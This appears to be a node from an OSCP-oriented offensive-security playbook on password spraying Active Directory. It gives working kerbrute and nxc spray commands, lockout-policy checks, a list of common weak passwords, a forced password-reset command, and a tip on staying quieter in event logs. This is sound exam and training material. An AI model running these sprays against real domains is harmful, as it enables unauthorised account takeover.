---
id: password-spray
title: Password Spraying
stage: initial-access
tags: [windows, linux, ad, smb]
summary: Test one password against all known users — the safest way to turn a username list into a credential without triggering lockouts.
leads_to:
  - winrm
  - rev-shell
  - rdp-access
  - ssh-access
  - bloodhound
---

## Prerequisites

A valid username list (from LDAP, kerbrute, SMTP, or RPC null session). The lockout policy **must** be checked before the first spray — locking accounts on an exam is catastrophic and unrecoverable.

Password spraying is controlled brute-force: one password across all users, then wait. The goal isn't to crack passwords — it's to find the one user who never changed their welcome credential. Once you have any domain user credential, the entire AD attack chain opens up (BloodHound, Kerberoast, ADCS checks).

## Step 0 — Check Lockout Policy FIRST

> Non-negotiable. A lockout threshold of 0 means spray freely; any other value means one password per observation window.

```bash
nxc smb $DC_IP -u '' -p '' --pass-pol
nxc smb $DC_IP -u user -p password --pass-pol
ldapsearch -H ldap://$DC_IP -x -b "DC=domain,DC=com" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration
```

## Quick Win

> Kerbreros-based spray — less noisy in Windows event logs than SMB.

```bash
kerbrute passwordspray --dc $DC_IP -d $DOMAIN users.txt 'Password123'
```

## SMB-Based Spray

> Full spray or paired list (one password per user — safe against lockout).

```bash
nxc smb $DC_IP -u users.txt -p 'Password123' --continue-on-success
nxc smb $DC_IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

## OSCP Password Priority Order

```
<blank>
Password123 / Password1
Welcome1 / Welcome123
Summer2025 / Winter2025 / Spring2025
<DomainName>1 / <DomainName>123
<username>   (username == password)
```

## Special Cases

> Account must change password — use smbpasswd.py to set a new one before proceeding.

```bash
smbpasswd.py '$DOMAIN/username:@$DC_IP' -newpass 'NewPassword1!'
```

## Leads To

Hit confirmed (`Pwn3d!`) → go immediately to that protocol's access node (winrm/rdp-access/ssh-access). Any valid domain credential → run bloodhound before anything else. No `Pwn3d!` but valid creds → check certipy for ADCS vulns, run kerberoast, follow BloodHound paths.
